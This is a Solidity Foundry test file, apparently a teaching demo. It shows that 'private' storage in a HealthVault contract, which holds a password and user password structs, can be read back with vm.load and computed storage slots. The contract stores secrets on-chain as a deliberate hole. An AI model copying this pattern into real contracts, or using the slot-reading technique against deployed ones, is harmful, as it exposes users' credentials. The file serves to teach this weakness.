// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    HealthVault BenefitvaultContract;

    function testReadprivatedata() public {
        BenefitvaultContract = new HealthVault(123456789);
        bytes32 leet = vm.load(address(BenefitvaultContract), bytes32(uint256(0)));
        console.log(uint256(leet));

        // users in slot 1 - length of array
        // starting from slot hash(1) - array elements
        // slot where array element is stored = keccak256(slot)) + (index * elementSize)
        // where slot = 1 and elementSize = 2 (1 (uint) +  1 (bytes32))
        bytes32 subscriber = vm.load(
            address(BenefitvaultContract),
            BenefitvaultContract.getArrayLocation(1, 1, 1)
        );
        console.log(uint256(subscriber));
    }
}

contract HealthVault {
    // slot 0
    uint256 private password;

    constructor(uint256 _password) {
        password = _password;
        Participant memory subscriber = Participant({id: 0, password: bytes32(_password)});
        users.push(subscriber);
        idToMember[0] = subscriber;
    }

    struct Participant {
        uint id;
        bytes32 password;
    }

    // slot 1
    Participant[] public users;
    // slot 2
    mapping(uint => Participant) public idToMember;

    function getArrayLocation(
        uint slot,
        uint index,
        uint elementSize
    ) public pure returns (bytes32) {
        uint256 a = uint(keccak256(abi.encodePacked(slot))) +
            (index * elementSize);
        return bytes32(a);
    }
}
